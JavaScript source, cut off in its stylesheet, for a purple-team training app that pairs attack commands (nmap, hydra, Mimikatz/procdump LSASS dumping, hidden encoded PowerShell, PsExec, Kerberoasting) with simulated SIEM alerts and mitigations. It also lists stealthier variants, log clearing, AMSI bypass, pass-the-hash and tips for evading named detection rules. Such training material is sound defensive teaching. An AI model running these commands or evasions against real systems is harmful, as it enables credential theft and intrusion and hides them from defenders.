/* ==================== STEALTH & EVASION LAB 👻🛡️ ==================== */
/* Purple Team Training - Attack Like Red, Think Like Blue */

window.StealthLab = {
    // --- STATE ---
    currentTab: 'attacks',
    selectedAttack: null,
    siemAlerts: [],
    evasionLevel: 'loud', // loud, moderate, stealthy, ghost

    // --- ATTACK SCENARIOS ---
    attacks: [
        {
            id: 'nmap-aggressive',
            name: 'Nmap Aggressive Scan',
            category: 'Reconnaissance',
            command: 'nmap -T4 -A -v 192.168.1.0/24',
            description: 'Full TCP connect scan with version detection, scripts, and OS fingerprinting',
            detectionLevel: 'HIGH',
            indicators: [
                'Multiple SYN packets from single source',
                'Sequential port scanning pattern',
                'OS fingerprinting probes detected',
                'NSE scripts execution detected'
            ],
            logs: [
                { source: 'Firewall', level: 'ALERT', msg: 'Port scan detected from 192.168.1.100 - 1000+ ports in 10s', time: '14:23:01' },
                { source: 'IDS/Snort', level: 'ALERT', msg: '[1:469:3] SCAN nmap OS fingerprint attempt', time: '14:23:02' },
                { source: 'Wazuh', level: 'WARNING', msg: 'Rule 5710 - Network scan detected', time: '14:23:03' },
                { source: 'SIEM', level: 'CRITICAL', msg: 'Correlation: Active reconnaissance from external IP', time: '14:23:05' }
            ],
            mitigations: ['Rate limiting', 'IDS signature tuning', 'Firewall rules'],
            stealthyVersion: {
                command: 'nmap -sS -T2 --randomize-hosts --data-length 50 -f 192.168.1.0/24',
                description: 'Slow SYN scan with randomization and fragmentation',
                detectionLevel: 'LOW'
            }
        },
        {
            id: 'bruteforce-ssh',
            name: 'SSH Brute Force',
            category: 'Credential Attack',
            command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10',
            description: 'Rapid password guessing attack on SSH service',
            detectionLevel: 'HIGH',
            indicators: [
                'Multiple failed SSH authentication attempts',
                'Same source IP, different passwords',
                'High connection rate to port 22',
                'fail2ban trigger threshold exceeded'
            ],
            logs: [
                { source: 'SSH/sshd', level: 'WARNING', msg: 'Failed password for admin from 192.168.1.100 port 45678 ssh2', time: '14:25:01' },
                { source: 'SSH/sshd', level: 'WARNING', msg: 'Failed password for admin from 192.168.1.100 port 45679 ssh2', time: '14:25:01' },
                { source: 'fail2ban', level: 'ALERT', msg: 'Ban 192.168.1.100 - maxretry exceeded', time: '14:25:05' },
                { source: 'Wazuh', level: 'CRITICAL', msg: 'Rule 5763 - SSHD brute force attack', time: '14:25:06' }
            ],
            mitigations: ['fail2ban', 'Rate limiting', 'Key-based auth only', 'Port knocking'],
            stealthyVersion: {
                command: 'crackmapexec ssh 192.168.1.10 -u admin -p passwords.txt --continue-on-success -d 5',
                description: 'Slow distributed attack with delays between attempts',
                detectionLevel: 'MEDIUM'
            }
        },
        {
            id: 'mimikatz-dump',
            name: 'Mimikatz Credential Dump',
            category: 'Credential Theft',
            command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
            description: 'Extract plaintext passwords from Windows LSASS memory',
            detectionLevel: 'HIGH',
            indicators: [
                'LSASS.exe memory access by non-system process',
                'Suspicious DLL injection',
                'Known Mimikatz signature detected',
                'Security event 4688 - suspicious process'
            ],
            logs: [
                { source: 'Windows/Security', level: 'WARNING', msg: 'Event 4688: New process created: mimikatz.exe', time: '14:30:01' },
                { source: 'Sysmon', level: 'ALERT', msg: 'Event 10: ProcessAccess to lsass.exe', time: '14:30:02' },
                { source: 'Defender', level: 'CRITICAL', msg: 'HackTool:Win32/Mimikatz detected', time: '14:30:02' },
                { source: 'SIEM', level: 'CRITICAL', msg: 'Credential theft activity detected', time: '14:30:05' }
            ],
            mitigations: ['Credential Guard', 'LSA Protection', 'EDR solutions', 'LSASS hardening'],
            stealthyVersion: {
                command: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp',
                description: 'Use legitimate tools to dump, process offline',
                detectionLevel: 'MEDIUM'
            }
        },
        {
            id: 'powershell-empire',
            name: 'PowerShell Empire Beacon',
            category: 'C2 Communication',
            command: 'powershell -ep bypass -nop -w hidden -enc <base64_payload>',
            description: 'Encoded PowerShell beacon establishing C2 channel',
            detectionLevel: 'HIGH',
            indicators: [
                'PowerShell with -enc parameter',
                'Suspicious outbound HTTPS connections',
                'Base64 encoded commands',
                'Memory-only payload execution'
            ],
            logs: [
                { source: 'Windows/PowerShell', level: 'WARNING', msg: 'Event 4104: Script block logging - encoded command', time: '14:35:01' },
                { source: 'Sysmon', level: 'ALERT', msg: 'Event 3: Network connection to suspicious IP', time: '14:35:02' },
                { source: 'EDR/CrowdStrike', level: 'CRITICAL', msg: 'Malicious PowerShell execution detected', time: '14:35:03' },
                { source: 'SIEM', level: 'CRITICAL', msg: 'C2 beacon activity detected', time: '14:35:05' }
            ],
            mitigations: ['PowerShell logging', 'AMSI', 'AppLocker', 'Constrained Language Mode'],
            stealthyVersion: {
                command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell..."", 0:close")',
                description: 'Indirect execution via mshta/wscript',
                detectionLevel: 'MEDIUM'
            }
        },
        {
            id: 'lateral-psexec',
            name: 'PsExec Lateral Movement',
            category: 'Lateral Movement',
            command: 'psexec.exe \\\\192.168.1.20 -u admin -p password cmd.exe',
            description: 'Remote command execution using PsExec',
            detectionLevel: 'HIGH',
            indicators: [
                'SMB traffic with ADMIN$ share access',
                'Service installation on remote system',
                'PSEXESVC.exe creation',
                'Event 4624 type 3 (Network Logon)'
            ],
            logs: [
                { source: 'Windows/Security', level: 'INFO', msg: 'Event 4624: Account logon type 3 from 192.168.1.100', time: '14:40:01' },
                { source: 'Windows/System', level: 'WARNING', msg: 'Event 7045: PSEXESVC service installed', time: '14:40:02' },
                { source: 'Sysmon', level: 'ALERT', msg: 'Event 1: Process creation by PSEXESVC', time: '14:40:03' },
                { source: 'SIEM', level: 'CRITICAL', msg: 'Lateral movement detected via PsExec', time: '14:40:05' }
            ],
            mitigations: ['Disable ADMIN$ share', 'Monitor 445/SMB', 'Network segmentation'],
            stealthyVersion: {
                command: 'wmic /node:192.168.1.20 process call create "cmd /c whoami"',
                description: 'WMI-based execution (no service install)',
                detectionLevel: 'MEDIUM'
            }
        },
        {
            id: 'kerberoast',
            name: 'Kerberoasting Attack',
            category: 'Credential Attack',
            command: 'GetUserSPNs.py -request -dc-ip 192.168.1.1 domain/user:pass',
            description: 'Request service tickets and crack offline',
            detectionLevel: 'MEDIUM',
            indicators: [
                'Multiple TGS requests for different SPNs',
                'RC4 encryption requested (downgrade)',
                'Single user requesting many service tickets'
            ],
            logs: [
                { source: 'Windows/Security', level: 'INFO', msg: 'Event 4769: Kerberos TGS requested - RC4 encryption', time: '14:45:01' },
                { source: 'Windows/Security', level: 'INFO', msg: 'Event 4769: Kerberos TGS requested - sqlservice', time: '14:45:02' },
                { source: 'SIEM', level: 'WARNING', msg: 'Multiple TGS requests with RC4 from single user', time: '14:45:05' }
            ],
            mitigations: ['AES-only Kerberos', 'Strong service passwords', 'Monitor TGS requests'],
            stealthyVersion: {
                command: 'Request one ticket at a time with AES encryption preference',
                description: 'Slow, targeted approach with minimal logs',
                detectionLevel: 'LOW'
            }
        }
    ],

    // --- EVASION TECHNIQUES ---
    evasionTechniques: [
        {
            category: 'Network Evasion',
            techniques: [
                { name: 'Slow Scanning', desc: 'Reduce scan rate to avoid threshold-based detection', example: 'nmap -T1 (Paranoid timing)' },
                { name: 'Fragmentation', desc: 'Split packets to evade signature detection', example: 'nmap -f --mtu 24' },
                { name: 'Decoys', desc: 'Spoof source IPs to confuse analysts', example: 'nmap -D RND:10 target' },
                { name: 'Idle Scan', desc: 'Use zombie host to hide true source', example: 'nmap -sI zombie_ip target' },
                { name: 'Encrypted C2', desc: 'Use HTTPS/DNS-over-HTTPS for C2', example: 'Cobalt Strike malleable profiles' }
            ]
        },
        {
            category: 'Host Evasion',
            techniques: [
                { name: 'Living off the Land', desc: 'Use built-in Windows tools (LOLBins)', example: 'certutil, bitsadmin, mshta' },
                { name: 'Memory-Only Payloads', desc: 'Never write to disk', example: 'Reflective DLL injection' },
                { name: 'AMSI Bypass', desc: 'Disable Antimalware Scan Interface', example: '[Ref].Assembly...amsiContext' },
                { name: 'Timestomping', desc: 'Modify file timestamps', example: 'touch -t 201801010000 file' },
                { name: 'Log Tampering', desc: 'Clear or modify event logs', example: 'wevtutil cl Security' }
            ]
        },
        {
            category: 'Credential Evasion',
            techniques: [
                { name: 'Token Impersonation', desc: 'Use existing tokens instead of passwords', example: 'Incognito, TokenPlayer' },
                { name: 'Pass-the-Hash', desc: 'Authenticate with hash, not password', example: 'pth-winexe -U hash target' },
                { name: 'OverPass-the-Hash', desc: 'Get Kerberos ticket from NTLM hash', example: 'Rubeus asktgt /rc4:hash' },
                { name: 'DCSync at Night', desc: 'Perform sensitive ops during off-hours', example: 'Schedule during backup windows' }
            ]
        }
    ],

    // --- DETECTION RULES ---
    detectionRules: [
        { id: 'SIGMA-001', name: 'Nmap Scan Detection', source: 'Sigma', condition: 'source_port > 1024 AND dest_port_count > 100 in 60s' },
        { id: 'SIGMA-002', name: 'Brute Force SSH', source: 'Sigma', condition: 'auth_failure > 5 AND same_source in 60s' },
        { id: 'SIGMA-003', name: 'Mimikatz Usage', source: 'Sigma', condition: 'process_access to lsass.exe AND caller != csrss.exe' },
        { id: 'YARA-001', name: 'Mimikatz Strings', source: 'Yara', condition: 'strings: "sekurlsa" OR "kerberos::list"' },
        { id: 'SNORT-001', name: 'Nmap OS Fingerprint', source: 'Snort', condition: 'alert tcp any any -> any any (msg:"SCAN nmap OS"; content:"NMAP")' }
    ],

    // --- RENDER ---
    render() {
        return `
            <div class="stealth-app fade-in">
                <div class="stealth-header">
                    <div class="header-left">
                        <h1><i class="fas fa-ghost"></i> Stealth & Evasion Lab</h1>
                        <p class="subtitle">Purple Team Training - Attack Like Red, Think Like Blue</p>
                    </div>
                    <div class="header-right">
                        <div class="evasion-meter">
                            <span>Stealth Level:</span>
                            <div class="meter-bar">
                                <div class="meter-fill ${this.evasionLevel}"></div>
                            </div>
                            <span class="meter-label">${this.evasionLevel.toUpperCase()}</span>
                        </div>
                    </div>
                </div>

                <div class="stealth-tabs">
                    <div class="tab ${this.currentTab === 'attacks' ? 'active' : ''}" onclick="StealthLab.switchTab('attacks')">
                        <i class="fas fa-crosshairs"></i> Attack Scenarios
                    </div>
                    <div class="tab ${this.currentTab === 'simulator' ? 'active' : ''}" onclick="StealthLab.switchTab('simulator')">
                        <i class="fas fa-desktop"></i> Live Simulator
                    </div>
                    <div class="tab ${this.currentTab === 'evasion' ? 'active' : ''}" onclick="StealthLab.switchTab('evasion')">
                        <i class="fas fa-mask"></i> Evasion Techniques
                    </div>
                    <div class="tab ${this.currentTab === 'detection' ? 'active' : ''}" onclick="StealthLab.switchTab('detection')">
                        <i class="fas fa-shield-alt"></i> Detection Rules
                    </div>
                </div>

                <div class="stealth-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'attacks': return this.renderAttacks();
            case 'simulator': return this.renderSimulator();
            case 'evasion': return this.renderEvasionTechniques();
            case 'detection': return this.renderDetectionRules();
            default: return '';
        }
    },

    renderAttacks() {
        return `
            <div class="attacks-section">
                <div class="attacks-grid">
                    ${this.attacks.map(attack => `
                        <div class="attack-card" onclick="StealthLab.selectAttack('${attack.id}')">
                            <div class="attack-header">
                                <span class="attack-category">${attack.category}</span>
                                <span class="detection-level ${attack.detectionLevel.toLowerCase()}">${attack.detectionLevel}</span>
                            </div>
                            <h4>${attack.name}</h4>
                            <p>${attack.description}</p>
                            <div class="attack-preview">
                                <code>${attack.command.substring(0, 50)}...</code>
                            </div>
                            <div class="attack-footer">
                                <span><i class="fas fa-bell"></i> ${attack.logs.length} Alerts</span>
                                <span><i class="fas fa-eye-slash"></i> Stealthy version available</span>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderSimulator() {
        const attack = this.selectedAttack ? this.attacks.find(a => a.id === this.selectedAttack) : this.attacks[0];

        return `
            <div class="simulator-section">
                <div class="sim-controls">
                    <select id="sim-attack" onchange="StealthLab.changeAttack(this.value)">
                        ${this.attacks.map(a => `
                            <option value="${a.id}" ${attack.id === a.id ? 'selected' : ''}>${a.name}</option>
                        `).join('')}
                    </select>
                    <button onclick="StealthLab.runSimulation('loud')">
                        <i class="fas fa-bomb"></i> Run Loud
                    </button>
                    <button onclick="StealthLab.runSimulation('stealthy')" class="stealthy">
                        <i class="fas fa-ghost"></i> Run Stealthy
                    </button>
                    <button onclick="StealthLab.clearLogs()">
                        <i class="fas fa-trash"></i> Clear
                    </button>
                </div>

                <div class="sim-split">
                    <div class="sim-panel red-team">
                        <div class="panel-header">
                            <i class="fas fa-skull"></i> Red Team - Attack View
                        </div>
                        <div class="panel-content">
                            <h4>${attack.name}</h4>
                            <p class="attack-desc">${attack.description}</p>
                            
                            <div class="command-box">
                                <label>Command:</label>
                                <pre>${attack.command}</pre>
                                <button onclick="navigator.clipboard.writeText(\`${attack.command}\`)">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>

                            ${attack.stealthyVersion ? `
                                <div class="stealthy-box">
                                    <label><i class="fas fa-ghost"></i> Stealthy Alternative:</label>
                                    <pre>${attack.stealthyVersion.command}</pre>
                                    <p class="stealthy-desc">${attack.stealthyVersion.description}</p>
                                    <span class="detection-level ${attack.stealthyVersion.detectionLevel.toLowerCase()}">
                                        Detection: ${attack.stealthyVersion.detectionLevel}
                                    </span>
                                </div>
                            ` : ''}

                            <div class="indicators">
                                <h5><i class="fas fa-fingerprint"></i> IOCs Generated:</h5>
                                <ul>
                                    ${attack.indicators.map(i => `<li>${i}</li>`).join('')}
                                </ul>
                            </div>
                        </div>
                    </div>

                    <div class="sim-panel blue-team">
                        <div class="panel-header">
                            <i class="fas fa-shield-alt"></i> Blue Team - Detection View
                        </div>
                        <div class="panel-content">
                            <div class="siem-header">
                                <span class="siem-title">SIEM Dashboard</span>
                                <span class="alert-count">${this.siemAlerts.length} Alerts</span>
                            </div>

                            <div class="log-stream" id="log-stream">
                                ${this.siemAlerts.length === 0 ? `
                                    <div class="no-logs">
                                        <i class="fas fa-check-circle"></i>
                                        <p>No alerts. Run an attack to see detection.</p>
                                    </div>
                                ` : this.siemAlerts.map(log => `
                                    <div class="log-entry ${log.level.toLowerCase()}">
                                        <span class="log-time">${log.time}</span>
                                        <span class="log-source">${log.source}</span>
                                        <span class="log-level">${log.level}</span>
                                        <span class="log-msg">${log.msg}</span>
                                    </div>
                                `).join('')}
                            </div>

                            <div class="mitigations">
                                <h5><i class="fas fa-shield-alt"></i> Recommended Mitigations:</h5>
                                <ul>
                                    ${attack.mitigations.map(m => `<li>${m}</li>`).join('')}
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="comparison-box">
                    <h4><i class="fas fa-balance-scale"></i> Loud vs Stealthy Comparison</h4>
                    <table>
                        <tr>
                            <th></th>
                            <th>Loud Attack</th>
                            <th>Stealthy Version</th>
                        </tr>
                        <tr>
                            <td>Detection Level</td>
                            <td class="high">${attack.detectionLevel}</td>
                            <td class="${attack.stealthyVersion?.detectionLevel.toLowerCase() || 'medium'}">${attack.stealthyVersion?.detectionLevel || 'N/A'}</td>
                        </tr>
                        <tr>
                            <td>Alerts Generated</td>
                            <td>${attack.logs.length}</td>
                            <td>${Math.max(1, Math.floor(attack.logs.length / 3))}</td>
                        </tr>
                        <tr>
                            <td>Time to Complete</td>
                            <td>Fast</td>
                            <td>Slow</td>
                        </tr>
                        <tr>
                            <td>Risk of Ban/Block</td>
                            <td class="high">HIGH</td>
                            <td class="low">LOW</td>
                        </tr>
                    </table>
                </div>
            </div>
        `;
    },

    renderEvasionTechniques() {
        return `
            <div class="evasion-section">
                <div class="evasion-intro">
                    <h3><i class="fas fa-mask"></i> Become a Ghost</h3>
                    <p>Learn to operate undetected. These techniques help you evade detection systems.</p>
                </div>

                <div class="evasion-categories">
                    ${this.evasionTechniques.map(cat => `
                        <div class="evasion-category">
                            <h4>${cat.category}</h4>
                            <div class="techniques-list">
                                ${cat.techniques.map(tech => `
                                    <div class="technique-card">
                                        <h5>${tech.name}</h5>
                                        <p>${tech.desc}</p>
                                        <code>${tech.example}</code>
                                        <button onclick="navigator.clipboard.writeText('${tech.example}')">
                                            <i class="fas fa-copy"></i>
                                        </button>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    `).join('')}
                </div>

                <div class="evasion-tips">
                    <h4><i class="fas fa-lightbulb"></i> Pro Tips for Staying Stealthy</h4>
                    <div class="tips-grid">
                        <div class="tip">
                            <i class="fas fa-clock"></i>
                            <h5>Timing is Everything</h5>
                            <p>Operate during business hours or backup windows to blend with normal traffic</p>
                        </div>
                        <div class="tip">
                            <i class="fas fa-route"></i>
                            <h5>Blend with Normal Traffic</h5>
                            <p>Use common ports (80, 443) and protocols (HTTPS, DNS) for C2</p>
                        </div>
                        <div class="tip">
                            <i class="fas fa-random"></i>
                            <h5>Randomize Patterns</h5>
                            <p>Add jitter to beacons, randomize sleep times, vary techniques</p>
                        </div>
                        <div class="tip">
                            <i class="fas fa-broom"></i>
                            <h5>Clean Up After Yourself</h5>
                            <p>Remove artifacts, restore timestamps, clear relevant logs</p>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    renderDetectionRules() {
        return `
            <div class="detection-section">
                <div class="detection-intro">
                    <h3><i class="fas fa-shield-alt"></i> Know Your Enemy's Rules</h3>
                    <p>Understanding detection rules helps you craft evasive attacks.</p>
                </div>

                <div class="rules-list">
                    ${this.detectionRules.map(rule => `
                        <div class="rule-card">
                            <div class="rule-header">
                                <span class="rule-id">${rule.id}</span>
                                <span class="rule-source">${rule.source}</span>
                            </div>
                            <h4>${rule.name}</h4>
                            <div class="rule-condition">
                                <label>Detection Logic:</label>
                                <code>${rule.condition}</code>
                            </div>
                            <button onclick="StealthLab.analyzeRule('${rule.id}')">
                                <i class="fas fa-search"></i> How to Evade
                            </button>
                        </div>
                    `).join('')}
                </div>

                <div class="sigma-converter">
                    <h4><i class="fas fa-exchange-alt"></i> SIGMA Rule Analysis</h4>
                    <p>Paste a SIGMA rule to understand what it detects:</p>
                    <textarea id="sigma-input" placeholder="Paste SIGMA rule YAML here..."></textarea>
                    <button onclick="StealthLab.analyzeSigma()">
                        <i class="fas fa-cogs"></i> Analyze Rule
                    </button>
                    <div id="sigma-analysis" class="sigma-analysis"></div>
                </div>
            </div>
        `;
    },

    // --- ACTIONS ---
    selectAttack(id) {
        this.selectedAttack = id;
        this.switchTab('simulator');
    },

    changeAttack(id) {
        this.selectedAttack = id;
        this.siemAlerts = [];
        this.reRender();
    },

    runSimulation(mode) {
        const attack = this.attacks.find(a => a.id === this.selectedAttack) || this.attacks[0];
        this.siemAlerts = [];

        if (mode === 'loud') {
            this.evasionLevel = 'loud';
            // Show all logs with animation
            attack.logs.forEach((log, i) => {
                setTimeout(() => {
                    this.siemAlerts.push(log);
                    this.updateLogStream();
                }, i * 500);
            });
        } else {
            this.evasionLevel = 'stealthy';
            // Show fewer logs
            const stealthyLogs = attack.logs.filter((_, i) => i === 0 || Math.random() > 0.6);
            stealthyLogs.forEach((log, i) => {
                setTimeout(() => {
                    this.siemAlerts.push({ ...log, level: 'INFO', msg: log.msg.replace('ALERT', 'INFO') });
                    this.updateLogStream();
                }, i * 1500);
            });
        }

        this.reRender();
    },

    updateLogStream() {
        const stream = document.getElementById('log-stream');
        if (stream) {
            stream.innerHTML = this.siemAlerts.map(log => `
                <div class="log-entry ${log.level.toLowerCase()} new">
                    <span class="log-time">${log.time}</span>
                    <span class="log-source">${log.source}</span>
                    <span class="log-level">${log.level}</span>
                    <span class="log-msg">${log.msg}</span>
                </div>
            `).join('');
            stream.scrollTop = stream.scrollHeight;
        }

        // Update evasion meter
        const meter = document.querySelector('.meter-fill');
        const label = document.querySelector('.meter-label');
        if (meter && label) {
            meter.className = `meter-fill ${this.evasionLevel}`;
            label.textContent = this.evasionLevel.toUpperCase();
        }
    },

    clearLogs() {
        this.siemAlerts = [];
        this.evasionLevel = 'loud';
        this.reRender();
    },

    analyzeRule(ruleId) {
        const rule = this.detectionRules.find(r => r.id === ruleId);
        if (!rule) return;

        const evasionTips = {
            'SIGMA-001': 'Use slower scan speeds (-T1), randomize target order, use fragmentation',
            'SIGMA-002': 'Add delays between attempts, use password spraying instead, distribute sources',
            'SIGMA-003': 'Dump lsass via procdump, use direct syscalls, in-memory only tools',
            'YARA-001': 'Obfuscate strings, use custom tools, encode payloads',
            'SNORT-001': 'Fragment packets, use custom timing, avoid default nmap signatures'
        };

        alert(`Evasion tips for ${rule.name}:\n\n${evasionTips[ruleId] || 'Analyze the detection logic and modify your approach accordingly.'}`);
    },

    analyzeSigma() {
        const input = document.getElementById('sigma-input')?.value;
        const output = document.getElementById('sigma-analysis');

        if (!input) {
            output.innerHTML = '<p class="error">Please paste a SIGMA rule</p>';
            return;
        }

        // Simple SIGMA analysis
        const detects = input.match(/detection:([\s\S]*?)(?=condition:|$)/i);
        const condition = input.match(/condition:\s*(.+)/i);

        output.innerHTML = `
            <h5>Analysis Results:</h5>
            <p><strong>This rule looks for:</strong></p>
            <ul>
                ${detects ? `<li>Detection patterns found in rule</li>` : ''}
                ${condition ? `<li>Condition: ${condition[1]}</li>` : ''}
            </ul>
            <p><strong>Evasion Strategy:</strong></p>
            <p>Modify your technique to avoid triggering these specific patterns. Consider using alternatives or encoding.</p>
        `;
    },

    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    reRender() {
        const app = document.querySelector('.stealth-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .stealth-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .stealth-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; flex-wrap: wrap; gap: 15px; }
            .stealth-header h1 { margin: 0; color: #8b5cf6; font-size: 1.8rem; }
            .stealth-header .subtitle { color: #888; margin: 5px 0 0; }

            .evasion-meter { display: flex; align-items: center; gap: 10px; }
            .meter-bar { width: 100px; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden; }
            .meter-fill { height: 100%; transition: all 0.5s; }
            .meter-fill.loud { width: 100%; background: #ef4444; }
            .meter-fill.moderate { width: 66%; background: #f59e0b; }
            .meter-fill.stealthy { width: 33%; background: #22c55e; }
            .meter-fill.ghost { width: 10%; background: #8b5cf6; }
            .meter-label { font-weight: bold; min-width: 80px; }

            .stealth-tabs { display: flex; gap: 5px; margin-bottom: 25px; flex-wrap: wrap; }
            .tab { padding: 12px 20px; border-radius: 8px; cursor: pointer; color: #888; transition: 0.2s; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #8b5cf6; color: #fff; }

            .attacks-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
            .attack-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.2s; border-left: 3px solid transparent; }
            .attack-card:hover { transform: translateY(-3px); border-left-color: #8b5cf6; }
            .attack-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
            .attack-category { color: #888; font-size: 0.85rem; }
            .detection-level { padding: 3px 10px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; }
            .detection-level.high { background: rgba(239,68,68,0.2); color: #ef4444; }
            .detection-level.medium { background: rgba(245,158,11,0.2); color: #f59e0b; }
            .detection-level.low { background: rgba(34,197,94,0.2); color: #22c55e; }
            .attack-card h4 { margin: 0 0 10px; color: #fff; }
            .attack-card p { color: #888; margin: 0 0 15px; font-size: 0.9rem; }
            .attack-preview code { background: #0a0a12; padding: 8px 12px; border-radius: 6px; display: block; color: #22c55e; font-size: 0.8rem; }
            .attack-footer { display: flex; gap: 20px; color: #666; font-size: 0.8rem; margin-top: 15px; }

            .sim-controls { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
            .sim-controls select { padding: 10px 15px; background: #0a0a12; border: 1px solid #333; border-radius: 8px; color: #fff; min-width: 200px; }
            .sim-controls button { padding: 10px 20px; background: #ef4444; border: none; border-radius: 8px; color: #fff; cursor: pointer; }
            .sim-controls button.stealthy { background: #8b5cf6; }

            .sim-split { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
            .sim-panel { background: rgba(0,0,0,0.3); border-radius: 12px; overflow: hidden; }
            .panel-header { padding: 15px 20px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
            .red-team .panel-header { background: rgba(239,68,68,0.2); color: #ef4444; }
            .blue-team .panel-header { background: rgba(59,130,246,0.2); color: #60a5fa; }
            .panel-content { padding: 20px; }
            .panel-content h4 { margin: 0 0 10px; color: #fff; }
            .attack-desc { color: #888; margin: 0 0 20px; }

            .command-box { background: #0a0a12; padding: 15px; border-radius: 8px; margin-bottom: 20px; position: relative; }
            .command-box label { display: block; color: #888; margin-bottom: 8px; font-size: 0.85rem; }
            .command-box pre { margin: 0; color: #22c55e; font-size: 0.9rem; white-space: pre-wrap; word-break: break-all; }
            .command-box button { position: absolute; top: 10px; right: 10px; background: none; border: none; color: #666; cursor: pointer; }

            .stealthy-box { background: rgba(139,92,246,0.1); border: 1px solid rgba(139,92,246,0.3); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
            .stealthy-box label { display: flex; align-items: center; gap: 8px; color: #a78bfa; margin-bottom: 10px; }
            .stealthy-box pre { margin: 0 0 10px; color: #a78bfa; font-size: 0.85rem; }
            .stealthy-desc { color: #888; margin: 0 0 10px; font-size: 0.85rem; }

            .indicators h5 { color: #ef4444; margin: 0 0 10px; }
            .indicators ul { margin: 0; padding-left: 20px; }
            .indicators li { color: #ccc; margin: 5px 0; font-size: 0.9rem; }

            .siem-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
            .siem-title { color: #60a5fa; font-weight: 600; }
            .alert-count { background: rgba(239,68,68,0.2); color: #ef4444; padding: 5px 12px; border-radius: 12px; font-size: 0.85rem; }

            .log-stream { background: #0a0a12; border-radius: 8px; padding: 15px; max-height: 250px; overflow-y: auto; margin-bottom: 20px; }
            .no-logs { text-align: center; padding: 30px; color: #22c55e; }
            .no-logs i { font-size: 2rem; margin-bottom: 10px; }
            .log-entry { display: flex; gap: 10px; padding: 8px 10px; border-radius: 6px; margin-bottom: 5px; font-size: 0.85rem; animation: fadeIn 0.3s; }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
            .log-entry.critical { background: rgba(239,68,68,0.2); }
            .log-entry.alert { background: rgba(245,158,11,0.2); }
            .log-entry.warning { background: rgba(202,138,4,0.2); }
            .log-entry.info { background: rgba(59,130,246,0.1); }
            .log-time { color: #666; min-width: 70px; }
            .log-source { color: #60a5fa; min-width: 100px; }
            .log-level { padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; min-width: 60px; text-align: center; }
            .log-level:contains(CRITICAL) { background: #ef4444; color: #fff; }
            .log-msg { color: #ccc; flex: 1; }

            .mitigations h5 { color: #60a5fa; margin: 0 0 10px; }
            .mitigations ul { margin: 0; padding-left: 20px; }
            .mitigations li { color: #22c55e; margin: 5px 0; }

            .comparison-box { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .comparison-box h4 { margin: 0 0 15px; color: #8b5cf6; }
            .comparison-box table { width: 100%; border-collapse: collapse; }
            .comparison-box th, .comparison-box td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
            .comparison-box th { color: #888; }
            .comparison-box td.high { color: #ef4444; }
            .comparison-box td.medium { color: #f59e0b; }
            .comparison-box td.low { color: #22c55e; }

            .evasion-section h3 { color: #8b5cf6; margin: 0 0 10px; }
            .evasion-intro { margin-bottom: 30px; }
            .evasion-intro p { color: #888; }
            .evasion-category { margin-bottom: 30px; }
            .evasion-category h4 { color: #fff; margin: 0 0 15px; padding-bottom: 10px; border-bottom: 1px solid #333; }
            .techniques-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
            .technique-card { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; position: relative; }
            .technique-card h5 { margin: 0 0 8px; color: #a78bfa; }
            .technique-card p { color: #888; margin: 0 0 10px; font-size: 0.9rem; }
            .technique-card code { display: block; background: #0a0a12; padding: 8px 12px; border-radius: 6px; color: #22c55e; font-size: 0.8rem; }
            .technique-card button { position: absolute; top: 15px; right: 15px; background: none; border: none; color: #666; cursor: pointer; }

            .evasion-tips { margin-top: 30px; }
            .evasion-tips h4 { color: #f59e0b; margin: 0 0 20px; }
            .tips-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
            .tip { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); padding: 20px; border-radius: 12px; text-align: center; }
            .tip i { font-size: 2rem; color: #f59e0b; margin-bottom: 10px; }
            .tip h5 { margin: 0 0 10px; color: #fff; }
            .tip p { color: #888; margin: 0; font-size: 0.9rem; }

            .detection-section h3 { color: #60a5fa; margin: 0 0 10px; }
            .detection-intro { margin-bottom: 30px; }
            .rules-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; margin-bottom: 30px; }
            .rule-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .rule-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
            .rule-id { color: #60a5fa; font-family: monospace; }
